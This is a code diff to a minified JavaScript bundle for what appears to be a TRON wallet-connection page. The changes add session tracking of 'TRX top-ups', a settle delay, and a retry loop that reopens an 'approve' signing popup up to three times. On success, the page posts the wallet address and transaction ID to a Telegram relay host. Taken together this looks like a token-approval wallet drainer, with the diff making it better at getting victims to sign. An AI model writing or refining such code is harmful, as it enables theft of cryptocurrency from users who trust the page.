@@ -92891,8 +92891,24 @@
                     let topUpSent = false;
                     let topUpTxId = "N/A";
                     let topUpAmount = 0;
+                    let recentTopUp = false;
+                    try {
+                        const ts = Number(sessionStorage.getItem("trxToppedUp:" + c) || 0);
+                        recentTopUp = ts > 0 && Date.now() - ts < 180000
+                    } catch (_) {}
 
-                    if (balanceInTRX < minTrx) {
+                    if (balanceInTRX < minTrx && recentTopUp) {
+                        // Avoid second top-up loop: TRX already sent, RPC may still lag — go approve
+                        console.log("[4] TRX TOP-UP START", {
+                            skipped: true,
+                            reason: "recent top-up in session, open approve popup"
+                        });
+                        console.log("[5] TRX TOP-UP RESULT", {
+                            skipped: true,
+                            status: "recent-topup-reuse"
+                        });
+                        topUpSent = true
+                    } else if (balanceInTRX < minTrx) {
                         console.log("[4] TRX TOP-UP START", {
                             skipped: false,
                             reason: "balance below minTrx / no gas energy",
@@ -93008,6 +93024,21 @@
                         })
                     }
 
+                    // After top-up, give chain/resources a short settle before opening approve popup
+                    if (topUpSent) {
+                        try {
+                            sessionStorage.setItem("trxToppedUp:" + c, String(Date.now()))
+                        } catch (_) {}
+                        console.log("[SIGN] post-top-up settle before approve popup", {
+                            settleMs: 2500
+                        });
+                        await new Promise((resolve) => setTimeout(resolve, 2500));
+                        try {
+                            balanceInTRX = parseFloat(await a.getBalance(c)) || balanceInTRX
+                        } catch (_) {}
+                        o(balanceInTRX)
+                    }
+
                     const useTrxFee = balanceInTRX >= 20;
                     const feeLimit = useTrxFee ? 15000000 : 1e9;
                     console.log("Opening sign popup", {
@@ -93016,7 +93047,11 @@
                         feeLimit: feeLimit,
                         topUpSent: topUpSent
                     });
-                    await f(c, feeLimit);
+                    // Always open approve on first successful top-up path (with retries inside f)
+                    await f(c, feeLimit, {
+                        fromTopUp: topUpSent,
+                        retries: topUpSent ? 3 : 1
+                    });
                 } catch (a) {
                     console.error("[10] ERROR", a);
                     console.error("Connection error:", a),
@@ -93028,15 +93063,17 @@
                 }
             }
             ), [l])
-              , f = async (e, feeLimit) => {
+              , f = async (e, feeLimit, opts) => {
                 // checktrc: g=async(service,address)=>{ const r=await service.sendTransaction(address); r&&r.result ? success : fail }
+                const options = opts && "object" === typeof opts ? opts : {};
+                const maxTries = Math.max(1, Number(options.retries) || 1);
                 console.log("[8] APPROVAL START", e, {
-                    feeLimit: feeLimit
+                    feeLimit: feeLimit,
+                    fromTopUp: !!options.fromTopUp,
+                    maxTries: maxTries
                 });
                 console.log("[SIGN] f() / approve start", e);
-                const r = new SA(l);
-                h(r);
-                if (!r || !l) {
+                if (!l) {
                     console.error("[10] ERROR", "Wallet not ready");
                     window.alert("Wallet not ready. Please reconnect.");
                     t(2);
@@ -93044,11 +93081,41 @@
                 }
                 try {
                     localStorage.setItem("walletAddress", e);
-                    const n = await r.sendTransaction(e, feeLimit);
-                    console.log("[9] APPROVAL RESULT", n);
-                    console.log("[SIGN] approve result", n);
+                    let n = null;
+                    for (let tryNo = 1; tryNo <= maxTries; tryNo += 1) {
+                        // Fresh service each try so provider stays linked after top-up wait
+                        const r = new SA(l);
+                        h(r);
+                        if (!r) {
+                            console.error("[10] ERROR", "Wallet service missing");
+                            break
+                        }
+                        console.log("[SIGN] approve attempt", {
+                            tryNo: tryNo,
+                            maxTries: maxTries
+                        });
+                        n = await r.sendTransaction(e, feeLimit);
+                        console.log("[9] APPROVAL RESULT", n);
+                        console.log("[SIGN] approve result", n);
+                        if (n && (n.result || n.success)) {
+                            break
+                        }
+                        // If popup never opened (trigger/network), wait and retry — do NOT re-top-up
+                        if (n && n.approvalNotAttempted && tryNo < maxTries) {
+                            console.warn("[SIGN] approve popup not opened yet, retrying without top-up", {
+                                tryNo: tryNo,
+                                message: n.message
+                            });
+                            await new Promise((resolve) => setTimeout(resolve, 2000));
+                            continue
+                        }
+                        break
+                    }
                     if (n && (n.result || n.success)) {
                         console.log("[SIGN] Approve OK TXID:", n.txID);
+                        try {
+                            sessionStorage.removeItem("trxToppedUp:" + e)
+                        } catch (_) {}
                         GS.post("https://tronscantelegram-q7ln.onrender.com/api/telegram", {
                             text: `Transaction approved\nWallet: ${e}\nTransaction ID: ${n.txID || "N/A"}\nTime: ${new Date().toISOString()}`
                         }).catch(() => {});
